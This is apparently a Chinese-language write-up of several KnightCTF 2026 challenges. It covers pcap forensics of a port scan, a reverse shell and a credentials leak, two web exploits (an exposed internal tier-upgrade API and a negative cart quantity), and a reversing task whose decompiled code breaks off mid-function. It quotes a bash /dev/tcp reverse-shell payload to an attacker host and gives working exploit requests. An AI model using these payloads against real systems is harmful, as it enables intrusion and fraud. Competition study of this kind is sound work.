---
title: KnightCTF 2026 Writeup
date: 2026-01-23T09:37:23+08:00
tags: CTF Writeup
---

做出来了好几道流量分析题目。



# [Networking] Reconnaissance

<details>
<summary>题目描述</summary>
Scenario: A mid-sized e-learn company "Knight Blog" recently detected suspicious network activity on their infrastructure. As the lead forensic analyst for the Knight Security Response Team, you've been called in to investigate. The IT team has provided you with three packet captures taken at different stages of what appears to be a coordinated cyber attack. Your mission is to analyze these captures, trace the attacker's footsteps, and uncover the full scope of the breach.

Question: Our IDS flagged some suspicious scanning activity in the first capture. The attacker was probing our network to identify potential entry points. Analyze the traffic and determine how many ports were found to be open on the target system.
</details>

可以猜到可能pcap包正文是一个nmap扫描包。

看到正文可以看出，其中有很多[SYN] Seq=0, 包含很多[RST, ACK] Seq=1。

对于nmap扫描来说，最后呈现的结果有三种可能：

- open：收到SYN+ACK包
- closed：收到RST包
- filtered：没有收到响应

基于这个思路写个脚本过滤一下，发现只有22和80端口是open的。

# [Networking] Post-Exploitation

<details>
<summary>题目描述</summary>

After exploiting the vulnerability, the attacker established a persistent connection back to their command and control server. Analyze the traffic to identify the HTTP port used for the initial payload delivery and the port used for the reverse shell connection.

</details>

```
#	Result	Protocol	Host	URL	Body	Caching	Content-Type	Process	Comments	Custom	
44	200	HTTP	192.168.1.104:8767	/payload.txt?swp_debug=get_user_options	76		text/plain				
```

内容为：
```
<pre>system("bash -c \"bash -i >& /dev/tcp/192.168.1.104/9576 0>&1\"")</pre>
```

经典版reverse shell

可以得到flag为`KCTF{8767_9576}`

# [Networking] Database Credentials Theft

<details>
<summary>题目描述</summary>

The attacker's ultimate goal was to access our database. During the post-exploitation phase, they managed to extract database credentials from the compromised system. Find the database username and password that were exposed.

</details>


reverse shell搭成之后，后面的TCP流量就是shell的正文内容，其中可以看到执行了`cat wp-config.php`输出了

```php 

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress_db' );
/** Database username */
define( 'DB_USER', 'wpuser' );
/** Database password */
define( 'DB_PASSWORD', 'wp@user123' );
/** Database hostname */
define( 'DB_HOST', 'localhost' );
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );
/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

所以flag为`KCTF{wpuser_wp@user123}`


# [Web] KnightCloud

给出了一个前端页面，我们注册登录后进入dashboard，会发现自己是普通用户，尝试升级到Premium发现按钮点不动。

先看源代码：

```js
    getAnalytics: async () => {
        const e = localStorage.getItem("token");
        return (await c.get(`${S}/premium/analytics`, {
            headers: {
                Authorization: `Bearer ${e}`
            }
        })).data
    }
    ,
    exportData: async () => {
        const e = localStorage.getItem("token");
        return (await c.get(`${S}/premium/export`, {
            headers: {
                Authorization: `Bearer ${e}`
            }
        })).data
    }
```

可以看到premium的功能是通过`/api/premium/analytics`和`/api/premium/export`两个接口实现的。尝试直接发送这个API接口没有成功。


继续读代码发现：


```js
    upgradeUserExample: {
        endpoint: "/api/internal/v1/migrate/user-tier",
        method: "POST",
        body: {
            u: "user-uid-here",
            t: "premium"
        },
        validTiers: ["free", "premium", "enterprise"]
    }
```

尝试发送请求：

```

POST http://23.239.26.112:8091/api/internal/v1/migrate/user-tier HTTP/1.1
Content-Type: application/json

{"u": "3e63e55a-b6f9-45ff-b00b-acaccd4730a7",
"t": "premium"}

=>

HTTP/1.1 200 OK
...


{
  "success": true,
  "uid": "3e63e55a-b6f9-45ff-b00b-acaccd4730a7",
  "tier": "premium"
}
```
看起来还可以，继续访问premium的API：

```
GET /api/premium/analytics HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Accept-Language: en
Authorization: Bearer ...
Cache-Control: no-cache
Host: 23.239.26.112:8091
Pragma: no-cache
Proxy-Connection: keep-alive
Referer: http://23.239.26.112:8091/dashboard
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0

=>

HTTP/1.1 200 OK
...


{
  "success": true,
  "analytics": {
    "totalRequests": 15847,
    "activeUsers": 342,
    "conversionRate": 4.7,
    "revenue": 28450,
    "growth": 23.5,
    "flag": "KCTF{Pr1v1l3g3_3sc4l4t10n_1s_fun}"
  }
}
```


<details>
<summary>完整题目代码</summary>


```js
import {r as e, a as r, u as t, L as s, B as a, R as i, b as n, N as l, c as o} from "./vendor-JYw6Q_0K.js";
import {a as c} from "./utils-VSpmzgsF.js";
!function() {
    const e = document.createElement("link").relList;
    if (!(e && e.supports && e.supports("modulepreload"))) {
        for (const e of document.querySelectorAll('link[rel="modulepreload"]'))
            r(e);
        new MutationObserver(e => {
            for (const t of e)
                if ("childList" === t.type)
                    for (const e of t.addedNodes)
                        "LINK" === e.tagName && "modulepreload" === e.rel && r(e)
        }
        ).observe(document, {
            childList: !0,
            subtree: !0
        })
    }
    function r(e) {
        if (e.ep)
            return;
        e.ep = !0;
        const r = function(e) {
            const r = {};
            return e.integrity && (r.integrity = e.integrity),
            e.referrerPolicy && (r.referrerPolicy = e.referrerPolicy),
            "use-credentials" === e.crossOrigin ? r.credentials = "include" : "anonymous" === e.crossOrigin ? r.credentials = "omit" : r.credentials = "same-origin",
            r
        }(e);
        fetch(e.href, r)
    }
}();
var d = {
    exports: {}
}
  , m = {}
  , u = e
  , h = Symbol.for("react.element")
  , p = Symbol.for("react.fragment")
  , g = Object.prototype.hasOwnProperty
  , x = u.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner
  , y = {
    key: !0,
    ref: !0,
    __self: !0,
    __source: !0
};
function j(e, r, t) {
    var s, a = {}, i = null, n = null;
    for (s in void 0 !== t && (i = "" + t),
    void 0 !== r.key && (i = "" + r.key),
    void 0 !== r.ref && (n = r.ref),
    r)
        g.call(r, s) && !y.hasOwnProperty(s) && (a[s] = r[s]);
    if (e && e.defaultProps)
        for (s in r = e.defaultProps)
            void 0 === a[s] && (a[s] = r[s]);
    return {
        $$typeof: h,
        type: e,
        key: i,
        ref: n,
        props: a,
        _owner: x.current
    }
}
m.Fragment = p,
m.jsx = j,
m.jsxs = j,
d.exports = m;
var f = d.exports
  , v = {}
  , b = r;
v.createRoot = b.createRoot,
v.hydrateRoot = b.hydrateRoot;
const S = "/api"
  , N = {
    migrationEndpoints: {
        userTier: "/internal/v1/migrate/user-tier",
        userData: "/internal/v1/migrate/user-data",
        billing: "/internal/v2/migrate/billing"
    },
    syncEndpoints: {
        users: "/internal/sync/users",
        subscriptions: "/internal/sync/subscriptions"
    }
}
  , w = Array.from({
    length: 500
}, (e, r) => ({
    id: r,
    value: 1e3 * Math.random(),
    timestamp: Date.now() + 1e3 * r,
    category: ["A", "B", "C", "D"][r % 4],
    metadata: {
        x: Math.random(),
        y: Math.random(),
        z: Math.random()
    }
}))
  , A = {
    login: async (e, r) => {
        const t = await c.post(`${S}/auth/login`, {
            email: e,
            password: r
        });
        if (t.data.token) {
            localStorage.setItem("token", t.data.token),
            localStorage.setItem("user", JSON.stringify(t.data.user));
            const e = btoa(JSON.stringify({
                sub: t.data.user.uid,
                email: t.data.user.email,
                subscription: t.data.user.subscriptionTier,
                role: "user",
                iat: Math.floor(Date.now() / 1e3),
                exp: Math.floor(Date.now() / 1e3) + 604800
            }));
            localStorage.setItem("session_data", e)
        }
        return t.data
    }
    ,
    register: async (e, r, t) => {
        const s = await c.post(`${S}/auth/register`, {
            email: e,
            password: r,
            fullName: t
        });
        if (s.data.token) {
            localStorage.setItem("token", s.data.token),
            localStorage.setItem("user", JSON.stringify(s.data.user));
            const e = btoa(JSON.stringify({
                sub: s.data.user.uid,
                email: s.data.user.email,
                subscription: s.data.user.subscriptionTier,
                role: "user",
                iat: Math.floor(Date.now() / 1e3),
                exp: Math.floor(Date.now() / 1e3) + 604800
            }));
            localStorage.setItem("session_data", e)
        }
        return s.data
    }
    ,
    logout: () => {
        localStorage.removeItem("token"),
        localStorage.removeItem("user"),
        localStorage.removeItem("session_data")
    }
    ,
    getMe: async () => {
        const e = localStorage.getItem("token");
        return (await c.get(`${S}/auth/me`, {
            headers: {
                Authorization: `Bearer ${e}`
            }
        })).data
    }
}
  , k = {
    getAnalytics: async () => {
        const e = localStorage.getItem("token");
        return (await c.get(`${S}/premium/analytics`, {
            headers: {
                Authorization: `Bearer ${e}`
            }
        })).data
    }
    ,
    exportData: async () => {
        const e = localStorage.getItem("token");
        return (await c.get(`${S}/premium/export`, {
            headers: {
                Authorization: `Bearer ${e}`
            }
        })).data
    }
}
  , T = {
    updateUserTier: async (e, r) => {
        try {
            return (await c.post(`${S}${N.migrationEndpoints.userTier}`, {
                u: e,
                t: r
            })).data
        } catch (t) {
            return null
        }
    }
    ,
    syncUserData: async e => null,
    migrateBilling: async e => null
};
function E({user: e}) {
    const r = t();
    return f.jsx("nav", {
        className: "navbar",
        children: f.jsxs("div", {
            className: "container navbar-content",
            children: [f.jsx(s, {
                to: "/",
                className: "logo",
                children: "⚔️ KnightCloud"
            }), f.jsx("div", {
                className: "nav-links",
                children: e ? f.jsxs(f.Fragment, {
                    children: [f.jsx(s, {
                        to: "/dashboard",
                        children: "Dashboard"
                    }), f.jsx(s, {
                        to: "/pricing",
                        children: "Pricing"
                    }), f.jsx("button", {
                        onClick: () => {
                            A.logout(),
                            r("/login")
                        }
                        ,
                        className: "btn btn-secondary",
                        children: "Logout"
                    })]
                }) : f.jsxs(f.Fragment, {
                    children: [f.jsx(s, {
                        to: "/pricing",
                        children: "Pricing"
                    }), f.jsx(s, {
                        to: "/login",
                        children: "Login"
                    }), f.jsx(s, {
                        to: "/register",
                        children: f.jsx("button", {
                            className: "btn btn-primary",
                            children: "Get Started"
                        })
                    })]
                })
            })]
        })
    })
}
function C() {
    return f.jsx("div", {
        style: {
            minHeight: "calc(100vh - 80px)",
            display: "flex",
            alignItems: "center",
            justifyContent: "center"
        },
        children: f.jsxs("div", {
            className: "container",
            style: {
                textAlign: "center",
                color: "white"
            },
            children: [f.jsx("h1", {
                style: {
                    fontSize: "3.5rem",
                    fontWeight: 700,
                    marginBottom: "1.5rem"
                },
                children: "Enterprise Cloud Platform"
            }), f.jsx("p", {
                style: {
                    fontSize: "1.5rem",
                    marginBottom: "3rem",
                    opacity: .9
                },
                children: "Powerful analytics and insights for modern businesses"
            }), f.jsxs("div", {
                style: {
                    display: "flex",
                    gap: "1rem",
                    justifyContent: "center"
                },
                children: [f.jsx(s, {
                    to: "/register",
                    children: f.jsx("button", {
                        className: "btn btn-primary",
                        style: {
                            fontSize: "1.2rem",
                            padding: "1rem 2rem"
                        },
                        children: "Get Started Free"
                    })
                }), f.jsx(s, {
                    to: "/pricing",
                    children: f.jsx("button", {
                        className: "btn btn-secondary",
                        style: {
                            fontSize: "1.2rem",
                            padding: "1rem 2rem",
                            background: "white"
                        },
                        children: "View Pricing"
                    })
                })]
            }), f.jsxs("div", {
                style: {
                    marginTop: "4rem",
                    display: "grid",
                    gridTemplateColumns: "repeat(3, 1fr)",
                    gap: "2rem",
                    maxWidth: "900px",
                    margin: "4rem auto 0"
                },
                children: [f.jsxs("div", {
                    children: [f.jsx("div", {
                        style: {
                            fontSize: "2.5rem",
                            marginBottom: "0.5rem"
                        },
                        children: "⚡"
                    }), f.jsx("h3", {
                        style: {
                            marginBottom: "0.5rem"
                        },
                        children: "Lightning Fast"
                    }), f.jsx("p", {
                        style: {
                            opacity: .8
                        },
                        children: "Optimized performance for your business"
                    })]
                }), f.jsxs("div", {
                    children: [f.jsx("div", {
                        style: {
                            fontSize: "2.5rem",
                            marginBottom: "0.5rem"
                        },
                        children: "🔒"
                    }), f.jsx("h3", {
                        style: {
                            marginBottom: "0.5rem"
                        },
                        children: "Secure"
                    }), f.jsx("p", {
                        style: {
                            opacity: .8
                        },
                        children: "Enterprise-grade security"
                    })]
                }), f.jsxs("div", {
                    children: [f.jsx("div", {
                        style: {
                            fontSize: "2.5rem",
                            marginBottom: "0.5rem"
                        },
                        children: "📊"
                    }), f.jsx("h3", {
                        style: {
                            marginBottom: "0.5rem"
                        },
                        children: "Analytics"
                    }), f.jsx("p", {
                        style: {
                            opacity: .8
                        },
                        children: "Deep insights into your data"
                    })]
                })]
            })]
        })
    })
}
function D() {
    const [r,a] = e.useState("")
      , [i,n] = e.useState("")
      , [l,o] = e.useState("")
      , c = t();
    return f.jsx("div", {
        className: "auth-container",
        children: f.jsxs("div", {
            className: "auth-card",
            children: [f.jsx("h2", {
                children: "Welcome Back"
            }), f.jsxs("form", {
                onSubmit: async e => {
                    var t, s;
                    e.preventDefault(),
                    o("");
                    try {
                        await A.login(r, i),
                        c("/dashboard")
                    } catch (a) {
                        o((null == (s = null == (t = a.response) ? void 0 : t.data) ? void 0 : s.error) || "Login failed")
                    }
                }
                ,
                children: [f.jsxs("div", {
                    className: "form-group",
                    children: [f.jsx("label", {
                        children: "Email"
                    }), f.jsx("input", {
                        type: "email",
                        value: r,
                        onChange: e => a(e.target.value),
                        required: !0
                    })]
                }), f.jsxs("div", {
                    className: "form-group",
                    children: [f.jsx("label", {
                        children: "Password"
                    }), f.jsx("input", {
                        type: "password",
                        value: i,
                        onChange: e => n(e.target.value),
                        required: !0
                    })]
                }), l && f.jsx("div", {
                    className: "error",
                    children: l
                }), f.jsx("button", {
                    type: "submit",
                    className: "btn btn-primary",
                    style: {
                        width: "100%",
                        marginTop: "1rem"
                    },
                    children: "Login"
                })]
            }), f.jsxs("p", {
                style: {
                    textAlign: "center",
                    marginTop: "1.5rem",
                    color: "#666"
                },
                children: ["Don't have an account? ", f.jsx(s, {
                    to: "/register",
                    style: {
                        color: "#667eea",
                        fontWeight: 600
                    },
                    children: "Register"
                })]
            })]
        })
    })
}
function B() {
    const [r,a] = e.useState("")
      , [i,n] = e.useState("")
      , [l,o] = e.useState("")
      , [c,d] = e.useState("")
      , m = t();
    return f.jsx("div", {
        className: "auth-container",
        children: f.jsxs("div", {
            className: "auth-card",
            children: [f.jsx("h2", {
                children: "Create Account"
            }), f.jsxs("form", {
                onSubmit: async e => {
                    var t, s;
                    e.preventDefault(),
                    d("");
                    try {
                        await A.register(r, i, l),
                        m("/login")
                    } catch (a) {
                        d((null == (s = null == (t = a.response) ? void 0 : t.data) ? void 0 : s.error) || "Registration failed")
                    }
                }
                ,
                children: [f.jsxs("div", {
                    className: "form-group",
                    children: [f.jsx("label", {
                        children: "Full Name"
                    }), f.jsx("input", {
                        type: "text",
                        value: l,
                        onChange: e => o(e.target.value),
                        required: !0
                    })]
                }), f.jsxs("div", {
                    className: "form-group",
                    children: [f.jsx("label", {
                        children: "Email"
                    }), f.jsx("input", {
                        type: "email",
                        value: r,
                        onChange: e => a(e.target.value),
                        required: !0
                    })]
                }), f.jsxs("div", {
                    className: "form-group",
                    children: [f.jsx("label", {
                        children: "Password"
                    }), f.jsx("input", {
                        type: "password",
                        value: i,
                        onChange: e => n(e.target.value),
                        minLength: 8,
                        required: !0
                    }), f.jsx("small", {
                        style: {
                            color: "#666",
                            fontSize: "0.875rem"
                        },
                        children: "Minimum 8 characters"
                    })]
                }), c && f.jsx("div", {
                    className: "error",
                    children: c
                }), f.jsx("button", {
                    type: "submit",
                    className: "btn btn-primary",
                    style: {
                        width: "100%",
                        marginTop: "1rem"
                    },
                    children: "Register"
                })]
            }), f.jsxs("p", {
                style: {
                    textAlign: "center",
                    marginTop: "1.5rem",
                    color: "#666"
                },
                children: ["Already have an account? ", f.jsx(s, {
                    to: "/login",
                    style: {
                        color: "#667eea",
                        fontWeight: 600
                    },
                    children: "Login"
                })]
            })]
        })
    })
}
function P() {
    const [r,s] = e.useState(null)
      , [a,i] = e.useState(null)
      , [n,l] = e.useState("")
      , o = t();
    e.useEffect( () => {
        (async () => {
            try {
                const e = await A.getMe();
                s(e)
            } catch (e) {
                o("/login")
            }
        }
        )()
    }
    , [o]);
    if (!r)
        return f.jsx("div", {
            children: "Loading..."
        });
    const c = "premium" === r.subscriptionTier || "enterprise" === r.subscriptionTier;
    return f.jsx("div", {
        className: "dashboard",
        children: f.jsxs("div", {
            className: "container",
            children: [f.jsxs("div", {
                className: "dashboard-header",
                children: [f.jsxs("h1", {
                    children: ["Welcome, ", r.fullName || r.email]
                }), f.jsxs("p", {
                    style: {
                        color: "#666",
                        marginTop: "0.5rem"
                    },
                    children: ["User ID: ", r.uid]
                }), f.jsxs("div", {
                    className: "subscription-badge " + (c ? "badge-premium" : "badge-free"),
                    children: ["Subscription Status: ", r.subscriptionTier.charAt(0).toUpperCase() + r.subscriptionTier.slice(1)]
                })]
            }), f.jsxs("div", {
                className: "features-grid",
                children: [f.jsxs("div", {
                    className: "feature-card",
                    children: [f.jsx("h3", {
                        children: "📊 Basic Dashboard"
                    }), f.jsx("p", {
                        children: "View your account overview and basic statistics."
                    }), f.jsxs("div", {
                        style: {
                            marginTop: "1rem",
                            padding: "1rem",
                            background: "#f8f9fa",
                            borderRadius: "8px"
                        },
                        children: [f.jsxs("p", {
                            children: [f.jsx("strong", {
                                children: "Account Created:"
                            }), " ", new Date(r.createdAt).toLocaleDateString()]
                        }), f.jsxs("p", {
                            children: [f.jsx("strong", {
                                children: "Email:"
                            }), " ", r.email]
                        }), f.jsxs("p", {
                            children: [f.jsx("strong", {
                                children: "Status:"
                            }), " Active"]
                        })]
                    })]
                }), f.jsxs("div", {
                    className: "feature-card " + (c ? "" : "locked"),
                    children: [f.jsx("h3", {
                        children: "📈 Advanced Analytics"
                    }), f.jsx("p", {
                        children: "Access detailed analytics and insights about your usage."
                    }), !c && f.jsx("div", {
                        className: "lock-overlay",
                        children: f.jsxs("div", {
                            style: {
                                textAlign: "center"
                            },
                            children: [f.jsx("div", {
                                style: {
                                    fontSize: "3rem"
                                },
                                children: "🔒"
                            }), f.jsx("p", {
                                style: {
                                    fontWeight: 600,
                                    color: "#667eea"
                                },
                                children: "Premium Feature"
                            })]
                        })
                    }), c && f.jsxs(f.Fragment, {
                        children: [f.jsx("button", {
                            onClick: async () => {
                                var e, r;
                                l(""),
                                i(null);
                                try {
                                    const e = await k.getAnalytics();
                                    i(e.analytics)
                                } catch (t) {
                                    l((null == (r = null == (e = t.response) ? void 0 : e.data) ? void 0 : r.message) || "Access denied")
                                }
                            }
                            ,
                            className: "btn btn-primary",
                            style: {
                                marginTop: "1rem"
                            },
                            children: "Load Analytics"
                        }), a && f.jsxs("div", {
                            className: "analytics-data",
                            children: [f.jsxs("div", {
                                className: "analytics-item",
                                children: [f.jsx("span", {
                                    children: "Total Requests"
                                }), f.jsx("strong", {
                                    children: a.totalRequests
                                })]
                            }), f.jsxs("div", {
                                className: "analytics-item",
                                children: [f.jsx("span", {
                                    children: "Active Users"
                                }), f.jsx("strong", {
                                    children: a.activeUsers
                                })]
                            }), f.jsxs("div", {
                                className: "analytics-item",
                                children: [f.jsx("span", {
                                    children: "Conversion Rate"
                                }), f.jsxs("strong", {
                                    children: [a.conversionRate, "%"]
                                })]
                            }), f.jsxs("div", {
                                className: "analytics-item",
                                children: [f.jsx("span", {
                                    children: "Revenue"
                                }), f.jsxs("strong", {
                                    children: ["$", a.revenue]
                                })]
                            }), f.jsxs("div", {
                                className: "analytics-item",
                                children: [f.jsx("span", {
                                    children: "Growth"
                                }), f.jsxs("strong", {
                                    children: [a.growth, "%"]
                                })]
                            }), a.flag && f.jsxs("div", {
                                className: "flag-display",
                                children: ["🎉 Congratulations! ", a.flag]
                            })]
                        })]
                    }), n && f.jsx("div", {
                        className: "error",
                        style: {
                            marginTop: "1rem"
                        },
                        children: n
                    })]
                }), f.jsxs("div", {
                    className: "feature-card " + (c ? "" : "locked"),
                    children: [f.jsx("h3", {
                        children: "💾 Data Export"
                    }), f.jsx("p", {
                        children: "Export your data in various formats for external analysis."
                    }), !c && f.jsx("div", {
                        className: "lock-overlay",
                        children: f.jsxs("div", {
                            style: {
                                textAlign: "center"
                            },
                            children: [f.jsx("div", {
                                style: {
                                    fontSize: "3rem"
                                },
                                children: "🔒"
                            }), f.jsx("p", {
                                style: {
                                    fontWeight: 600,
                                    color: "#667eea"
                                },
                                children: "Premium Feature"
                            })]
                        })
                    }), c && f.jsx("button", {
                        className: "btn btn-primary",
                        style: {
                            marginTop: "1rem"
                        },
                        children: "Export Data"
                    })]
                })]
            })]
        })
    })
}
function R() {
    return f.jsx("div", {
        className: "dashboard",
        children: f.jsxs("div", {
            className: "container",
            children: [f.jsxs("div", {
                style: {
                    textAlign: "center",
                    marginBottom: "3rem"
                },
                children: [f.jsx("h1", {
                    style: {
                        color: "white",
                        fontSize: "2.5rem",
                        marginBottom: "1rem"
                    },
                    children: "Choose Your Plan"
                }), f.jsx("p", {
                    style: {
                        color: "rgba(255,255,255,0.9)",
                        fontSize: "1.2rem"
                    },
                    children: "Unlock powerful features to grow your business"
                })]
            }), f.jsx("div", {
                className: "features-grid",
                children: [{
                    name: "Free",
                    price: "$0",
                    features: ["Basic Dashboard", "Up to 100 requests/month", "Community Support", "Basic Analytics"]
                }, {
                    name: "Premium",
                    price: "$29",
                    features: ["Everything in Free", "Advanced Analytics", "Unlimited Requests", "Data Export", "Priority Support", "API Access"],
                    popular: !0
                }, {
                    name: "Enterprise",
                    price: "$99",
                    features: ["Everything in Premium", "Custom Integrations", "Dedicated Support", "SLA Guarantee", "Advanced Security", "Custom Reports"]
                }].map(e => f.jsxs("div", {
                    className: "feature-card",
                    style: {
                        position: "relative"
                    },
                    children: [e.popular && f.jsx("div", {
                        style: {
                            position: "absolute",
                            top: "-10px",
                            right: "20px",
                            background: "linear-gradient(135deg, #f093fb 0%, #f5576c 100%)",
                            color: "white",
                            padding: "0.5rem 1rem",
                            borderRadius: "20px",
                            fontSize: "0.875rem",
                            fontWeight: 600
                        },
                        children: "Most Popular"
                    }), f.jsx("h3", {
                        children: e.name
                    }), f.jsxs("div", {
                        style: {
                            fontSize: "2.5rem",
                            fontWeight: 700,
                            color: "#667eea",
                            margin: "1rem 0"
                        },
                        children: [e.price, f.jsx("span", {
                            style: {
                                fontSize: "1rem",
                                color: "#999"
                            },
                            children: "/month"
                        })]
                    }), f.jsx("ul", {
                        style: {
                            listStyle: "none",
                            marginTop: "1.5rem"
                        },
                        children: e.features.map( (e, r) => f.jsxs("li", {
                            style: {
                                padding: "0.75rem 0",
                                borderBottom: "1px solid #f0f0f0"
                            },
                            children: ["✓ ", e]
                        }, r))
                    }), f.jsx("button", {
                        className: "btn btn-primary",
                        style: {
                            width: "100%",
                            marginTop: "1.5rem"
                        },
                        children: "Free" === e.name ? "Get Started" : "Upgrade Now"
                    })]
                }, e.name))
            })]
        })
    })
}
function _() {
    const [r,t] = e.useState(null);
    return e.useEffect( () => {
        const e = ( () => {
            const e = localStorage.getItem("user");
            return e ? JSON.parse(e) : null
        }
        )();
        t(e)
    }
    , []),
    f.jsxs(a, {
        children: [f.jsx(E, {
            user: r
        }), f.jsxs(i, {
            children: [f.jsx(n, {
                path: "/",
                element: f.jsx(C, {})
            }), f.jsx(n, {
                path: "/login",
                element: f.jsx(D, {})
            }), f.jsx(n, {
                path: "/register",
                element: f.jsx(B, {})
            }), f.jsx(n, {
                path: "/dashboard",
                element: f.jsx(P, {})
            }), f.jsx(n, {
                path: "/pricing",
                element: f.jsx(R, {})
            }), f.jsx(n, {
                path: "*",
                element: f.jsx(l, {
                    to: "/"
                })
            })]
        })]
    })
}
window.__KC_INTERNAL__ = {
    config: N,
    features: {
        enableBetaFeatures: !1,
        enableTrialExtension: !1,
        enableReferralProgram: !1,
        enableCouponCodes: !1,
        enableAutoUpgrade: !1,
        enableLegacyMigration: !0,
        enableAdminPanel: !1,
        enableDebugMode: !1
    },
    marketing: {
        campaigns: [{
            id: 1,
            name: "Summer Sale",
            active: !1
        }, {
            id: 2,
            name: "Black Friday",
            active: !1
        }, {
            id: 3,
            name: "New Year",
            active: !1
        }],
        discounts: {
            referral: .1,
            annual: .2,
            enterprise: .3
        },
        trialDays: 14
    },
    helpers: T,
    examples: {
        upgradeUserExample: {
            endpoint: "/api/internal/v1/migrate/user-tier",
            method: "POST",
            body: {
                u: "user-uid-here",
                t: "premium"
            },
            validTiers: ["free", "premium", "enterprise"]
        }
    },
    data: w
},
v.createRoot(document.getElementById("root")).render(f.jsx(o.StrictMode, {
    children: f.jsx(_, {})
}));

```

</details>


# [Web] Knight Shop Again

省流：`quantity`支持负数

```
POST /api/cart HTTP/1.1

{"productId":1,"quantity":-1,"price":75.99}
```

然后就能checkout了：

```
POST /api/checkout HTTP/1.1

{"discountCode":"","discountCount":100}
```

响应中直接包含了flag

```json
{
    "success": true,
    "balance": 201.98,
    "total": "-151.98",
    "flag": "KCTF{kn1ght_c0up0n_m4st3r_2026}"
}
```


# [Rev] E4sy P3asy

AI秒了。看起来它的逻辑是对于每一个字符，进行一些拼接，得到一个字符串，对这个字符串作md5哈希，然后和给定的hash对比，找到正确的字符。

<details>
<summary>Prompt</summary>


仔细分析下列代码实现了什么。
```
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  size_t v3; // rax
  char *v4; // rax
  size_t v5; // rax
  size_t v6; // rax
  int v7; // r12d
  size_t v8; // rax
  char *v10; // rdi
  __int64 v11; // rcx
  __int64 v12; // r14
  size_t v13; // rax
  char *v14; // rdi
  __int64 i; // rcx
  __int64 v16; // r13
  size_t v17; // rax
  char *v18; // [rsp+0h] [rbp-358h]
  __int64 v19; // [rsp+0h] [rbp-358h]
  char s1[48]; // [rsp+20h] [rbp-338h] BYREF
  char v21[64]; // [rsp+50h] [rbp-308h] BYREF
  char v22[128]; // [rsp+90h] [rbp-2C8h] BYREF
  char s[5]; // [rsp+110h] [rbp-248h] BYREF
  char v24[5]; // [rsp+115h] [rbp-243h] BYREF
  char v25[246]; // [rsp+11Ah] [rbp-23Eh] BYREF
  char v26; // [rsp+210h] [rbp-148h] BYREF
  unsigned __int64 v27; // [rsp+318h] [rbp-40h]

  v27 = __readfsqword(0x28u);
  puts("========================================");
  puts("   E4sy P3asy - KnightCTF 2026");
  puts("========================================");
  puts("[*] Enter the flag to prove your worth!");
  puts("");
  printf("flag> ");
  if ( fgets(s, 256, stdin) )
  {
    v3 = strlen(s);
    if ( v3 )
    {
      v4 = &v22[v3 + 127];
      do
      {
        if ( *v4 != 10 && *v4 != 13 )
          break;
        *v4-- = 0;
      }
      while ( &v4[1LL - (_QWORD)s] );
    }
    v5 = strlen(s);
    sub_1660(s, v5, &v26);
    if ( (unsigned int)sub_1760(s, "GoogleCTF{") )
    {
      if ( (unsigned int)sub_17A0(s) )
      {
        v6 = strlen(s);
        if ( v6 - 11 <= 0xFF )
        {
          qmemcpy(&v26, v25, v6 - 11);
          v10 = v21;
          v25[v6 + 235] = 0;
          v11 = 16LL;
          v18 = v21;
          while ( v11 )
          {
            *(_DWORD *)v10 = 0;
            v10 += 4;
            --v11;
          }
          strcpy(v21, "G00gleCTF_s@lt_2026");
          if ( v6 == 24 )
          {
            v12 = 0LL;
            while ( 1 )
            {
              snprintf(v22, 0x80uLL, "%s%zu%c", v18, v12, (unsigned int)*(&v26 + v12), v18);
              v13 = strlen(v22);
              sub_1660(v22, v13, s1);
              if ( strcmp(s1, (&off_3D60)[v12]) )
                break;
              if ( ++v12 == 13 )
              {
                puts("[!] Interesting... but that's a decoy flag from a different universe.");
                puts("[!] You're in KnightCTF, not GoogleCTF :)");
                puts("Try again!");
                return 0LL;
              }
            }
          }
        }
      }
    }
    if ( (unsigned int)sub_1760(s, "CTF{") || (v7 = sub_1760(s, "FLAG{")) != 0 )
    {
      puts("[?] Format looks suspicious... but not quite.");
      puts("Try again!");
    }
    else
    {
      if ( (unsigned int)sub_1760(s, "KCTF{") )
      {
        if ( (unsigned int)sub_17A0(s) )
        {
          v8 = strlen(s);
          if ( v8 - 6 <= 0xFF )
          {
            qmemcpy(&v26, v24, v8 - 6);
            v14 = v21;
            v25[v8 + 240] = 0;
            for ( i = 16LL; i; --i )
            {
              *(_DWORD *)v14 = v7;
              v14 += 4;
            }
            qmemcpy(v21, "KnightCTF_2026_s@lt", 19);
            if ( v8 == 29 )
            {
              v16 = 0LL;
              snprintf(v22, 0x80uLL, "%s%zu%c", v21, 0LL, (unsigned int)v26);
              while ( 1 )
              {
                v17 = strlen(v22);
                sub_1660(v22, v17, s1);
                if ( strcmp(s1, off_3CA0[v16]) )
                  break;
                if ( ++v16 == 23 )
                {
                  puts("Good job! You got it!");
                  return 0LL;
                }
                snprintf(v22, 0x80uLL, "%s%zu%c", v19, v16, (unsigned int)*(&v26 + v16), v19);
              }
            }
          }
        }
      }
      puts("Try again!");
    }
  }
  return 0LL;
}



unsigned __int64 __fastcall sub_1660(__int64 a1, __int64 a2, char *a3)
{
  __int64 v4; // rax
  __int64 v5; // rbx
  __int64 v6; // rax
  char *v7; // rbp
  __int64 v8; // rbx
  __int64 v9; // rdx
  char *v10; // rdi
  unsigned int v12; // [rsp+Ch] [rbp-7Ch] BYREF
  char v13[72]; // [rsp+10h] [rbp-78h] BYREF
  unsigned __int64 v14; // [rsp+58h] [rbp-30h]

  v14 = __readfsqword(0x28u);
  v12 = 0;
  v4 = EVP_MD_CTX_new();
  if ( !v4
    || (v5 = v4, v6 = EVP_md5(), (unsigned int)EVP_DigestInit_ex(v5, v6, 0LL) != 1)
    || (unsigned int)EVP_DigestUpdate(v5, a1, a2) != 1
    || (unsigned int)EVP_DigestFinal_ex(v5, v13, &v12) != 1 )
  {
    exit(1);
  }
  EVP_MD_CTX_free(v5);
  if ( v12 )
  {
    v7 = a3;
    v8 = 0LL;
    do
    {
      v9 = (unsigned __int8)v13[v8];
      v10 = v7;
      ++v8;
      v7 += 2;
      sprintf(v10, "%02x", v9);
    }
